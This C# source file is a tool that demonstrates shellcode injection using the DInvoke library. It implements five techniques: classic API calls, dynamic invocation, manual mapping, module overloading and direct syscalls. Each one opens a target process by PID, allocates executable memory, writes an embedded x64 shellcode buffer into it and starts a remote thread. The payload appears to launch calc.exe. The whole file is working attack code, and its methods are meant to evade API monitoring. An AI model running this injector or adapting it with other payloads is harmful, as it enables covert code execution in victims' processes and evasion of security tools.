using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using static ShellcodeInjection.Imports.Imports;

namespace ShellcodeInjection
{
    class Program
    {
        static void classic(int processId)
        {
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 };

            IntPtr ptr = IntPtr.Zero;
            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            OpenProcessD OpenProcess = (OpenProcessD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(OpenProcessD));
            IntPtr procHandle = OpenProcess((uint)desiredAccess, false, (uint)processId);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            VirtualAllocExD VirtualAllocEx =
                (VirtualAllocExD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(VirtualAllocExD));
            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            WriteProcessMemoryD WriteProcessMemory = (WriteProcessMemoryD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WriteProcessMemoryD));
            bool success = WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            CreateRemoteThreadD CreateRemoteThread = (CreateRemoteThreadD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(CreateRemoteThreadD));
            IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void dynamicinvoke(int processId)
        {
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 };

            IntPtr ptr = IntPtr.Zero;
            object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };
            IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(OpenProcessD), ref OpenProcessArgs);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            object[] VirtualAllocExArgs = { procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE };
            IntPtr init = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAllocEx", typeof(VirtualAllocExD), ref VirtualAllocExArgs);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            object[] WriteProcessMemoryArgs = { procHandle, init, buf, shellcode_size, bytesWritten };
            bool success = (bool)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(WriteProcessMemoryD), ref WriteProcessMemoryArgs);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            //object[] CreateRemoteThreadArgs = { procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP };
            //IntPtr threadPTR = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CreateRemoteThread", typeof(CreateRemoteThreadD), ref CreateRemoteThreadArgs);
            // Using the DInvoke way cause the upper one returns an error. TODO: Fix this.
            IntPtr threadPTR = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void manualmap(int processId)
        {
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 };

            PE.PE_MANUAL_MAP mappedDLL = new PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");

            IntPtr ptr = IntPtr.Zero;
            object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };
            IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "OpenProcess", typeof(OpenProcessD), OpenProcessArgs, false);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            object[] VirtualAllocExArgs = { procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE };
            IntPtr init = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "VirtualAllocEx", typeof(VirtualAllocExD), VirtualAllocExArgs, false);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            object[] WriteProcessMemoryArgs = { procHandle, init, buf, shellcode_size, bytesWritten };
            bool success = (bool)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "WriteProcessMemory", typeof(WriteProcessMemoryD), WriteProcessMemoryArgs, false);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            //object[] CreateRemoteThreadArgs = { procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP };
            //IntPtr threadPTR = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "CreateRemoteThread", typeof(CreateRemoteThreadD), CreateRemoteThreadArgs, false);
            IntPtr threadPTR = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void overload(int processId)
        {
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 };

            PE.PE_MANUAL_MAP mappedDLL = new PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Overload.OverloadModule(@"C:\Windows\System32\kernel32.dll");

            IntPtr ptr = IntPtr.Zero;
            object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };
            IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "OpenProcess", typeof(OpenProcessD), OpenProcessArgs, false);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            object[] VirtualAllocExArgs = { procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE };
            IntPtr init = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "VirtualAllocEx", typeof(VirtualAllocExD), VirtualAllocExArgs, false);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            object[] WriteProcessMemoryArgs = { procHandle, init, buf, shellcode_size, bytesWritten };
            bool success = (bool)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "WriteProcessMemory", typeof(WriteProcessMemoryD), WriteProcessMemoryArgs, false);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            //object[] CreateRemoteThreadArgs = { procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP };
            //IntPtr threadPTR = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "CreateRemoteThread", typeof(CreateRemoteThreadD), CreateRemoteThreadArgs, false);
            IntPtr threadPTR = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void syscalls(int processId)
        {
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            byte[] data = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 };

            IntPtr syscall = IntPtr.Zero;
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess NtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtOpenProcess));
            var oa = new Native.OBJECT_ATTRIBUTES();
            var cid = new Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)processId
            };
            var procHandle = IntPtr.Zero;
            Native.NTSTATUS status = NtOpenProcess(ref procHandle,
                desiredAccess,
                ref oa,
                ref cid);

            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            IntPtr shellcode_size = (IntPtr)data.Length;
            IntPtr init = IntPtr.Zero;
            uint bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory NtAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtAllocateVirtualMemory));
            status = NtAllocateVirtualMemory(procHandle, ref init, IntPtr.Zero, ref shellcode_size, State.MEM_COMMIT | State.MEM_RESERVE, Protection.PAGE_EXECUTE_READWRITE);

            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory NtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtWriteVirtualMemory));
            var buf = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, buf, data.Length);
            status = NtWriteVirtualMemory(procHandle, init, buf, (uint)shellcode_size, ref bytesWritten);

            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. Bytes written: {bytesWritten}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx NtCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtCreateThreadEx));
            IntPtr hThread = IntPtr.Zero;
            status = NtCreateThreadEx(out hThread, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, procHandle, init, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {hThread}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }
        }

        static void banner()
        {
            string banner = @"   _____ _          _ _               _        _____       _           _   _             
  / ____| |        | | |             | |      |_   _|     (_)         | | (_)            
 | (___ | |__   ___| | | ___ ___   __| | ___    | |  _ __  _  ___  ___| |_ _  ___  _ __  
  \___ \| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \   | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
  ____) | | | |  __/ | | (_| (_) | (_| |  __/  _| |_| | | | |  __/ (__| |_| | (_) | | | |
 |_____/|_| |_|\___|_|_|\___\___/ \__,_|\___| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
                                                         _/ |                            
                                                        |__/                             ";
            Console.WriteLine(banner);
            Console.WriteLine("==> Demo shellcode injection techniques using Github/@TheWover's DInvoke Project.");
            Console.WriteLine();
        }

        static void usage()
        {
            Console.WriteLine("[*] Usage: ./shellcodeinjection.exe <PID to Inject shellcode into>");
            Console.WriteLine("[*] Remove the comment from the technique you want to use in the program. By default it uses Syscalls method.");
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                banner();
                usage();
            }
            else
            {
                banner();
                //classic(Convert.ToInt32(args[0]));
                //dynamicinvoke(Convert.ToInt32(args[0]));
                //manualmap(Convert.ToInt32(args[0]));
                //overload(Convert.ToInt32(args[0]));
                syscalls(Convert.ToInt32(args[0]));
            }
        }
    }
}
